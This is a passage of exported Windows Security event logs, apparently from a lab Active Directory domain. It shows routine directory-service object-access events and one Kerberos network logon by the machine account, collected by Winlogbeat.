		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0xcbe5c	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110211	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.322"	"rxDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBE5C

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbe5c	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110210	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.322"	"rhDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBE5C

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967a00-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967a00-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbe5c	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110209	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.322"	"rRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649DCB

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x649dcb	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110208	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.322"	"rBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649DCB

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x649dcb	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110207	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.322"	"qxDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649DCB

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0x649dcb	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110206	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.322"	"qhDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649DCB

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x649dcb	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110205	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.322"	"qRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649DCB

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x649dcb	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110204	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.319"	"qBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x649DCB
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.251
	Source Port:		50492

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.251"	50492	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x649dcb	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,876"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110202	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:03:14.211"	"pxDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110195	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.171"	"phDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{4229c897-c211-437c-a5ae-dbf705b696e5}
	Object Name:		%{b0e68889-1cac-4c45-a037-32d97de9583c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{4229c897-c211-437c-a5ae-dbf705b696e5}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{048b4692-6227-4b67-a074-c4437083e14b}
			{6c7b5785-3d21-41bf-8a8a-627941544d5a}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{b0e68889-1cac-4c45-a037-32d97de9583c}"	DS	"%{4229c897-c211-437c-a5ae-dbf705b696e5}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{4229c897-c211-437c-a5ae-dbf705b696e5}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{048b4692-6227-4b67-a074-c4437083e14b}
			{6c7b5785-3d21-41bf-8a8a-627941544d5a}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110182	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.171"	"pRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{04828aa9-6e42-4e80-b962-e2fe00754d17}
	Object Name:		%{1b40cab4-6cfa-43f9-81fb-db400c3d0071}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{04828aa9-6e42-4e80-b962-e2fe00754d17}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{1b40cab4-6cfa-43f9-81fb-db400c3d0071}"	DS	"%{04828aa9-6e42-4e80-b962-e2fe00754d17}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
